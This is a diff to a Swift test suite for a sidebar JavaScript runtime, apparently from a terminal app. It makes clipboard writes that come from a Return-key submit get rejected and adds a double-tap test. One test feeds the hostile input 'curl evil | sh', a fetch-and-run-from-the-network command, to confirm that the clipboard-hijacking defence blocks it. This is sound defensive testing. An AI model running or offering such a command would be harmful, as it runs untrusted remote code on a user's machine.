@@ -3,7 +3,7 @@ import CmuxSwiftRender
 import Testing
 
 /// `clipboard.write(text)` is gated on user activation: it writes only while
-/// the runtime is dispatching a click, double-click, submit or menu-item tap,
+/// the runtime is dispatching a click, double-click or menu-item tap,
 /// so background code (load, data updates, callbacks deferred past the
 /// gesture) cannot swap the clipboard before the user pastes into a shell.
 @MainActor
@@ -160,7 +160,10 @@ struct SidebarJSRuntimeClipboardTests {
         #expect(writes.isEmpty)
     }
 
-    @Test func returnKeySubmitWritesClipboard() {
+    /// Return isn't trusted either: an autofocused field mounted by a data
+    /// update can take the terminal's focus, and the user's next Return,
+    /// meant for the terminal, would then submit it.
+    @Test func returnKeySubmitIsRejected() {
         var writes: [String] = []
         let runtime = SidebarJSRuntime()
         runtime.dispatch = SidebarActionDispatch(run: { _ in }, writeClipboard: { writes.append($0) })
@@ -171,8 +174,20 @@ struct SidebarJSRuntimeClipboardTests {
         runtime.dispatchEvent(
             nodeId: fieldId,
             event: "submit",
-            payload: ["text": "w1", "trigger": "return"]
+            payload: ["text": "curl evil | sh", "trigger": "return"]
         )
+        #expect(writes.isEmpty)
+    }
+
+    @Test func doubleTapWritesClipboard() {
+        var writes: [String] = []
+        let runtime = SidebarJSRuntime()
+        runtime.dispatch = SidebarActionDispatch(run: { _ in }, writeClipboard: { writes.append($0) })
+        runtime.start(source: """
+        sidebar(() => Text("row").onDoubleTap(() => clipboard.write("w1")))
+        """)
+        let rootId = try! #require(runtime.store.rootId)
+        runtime.dispatchEvent(nodeId: rootId, event: "doubletap")
         #expect(writes == ["w1"])
     }
 
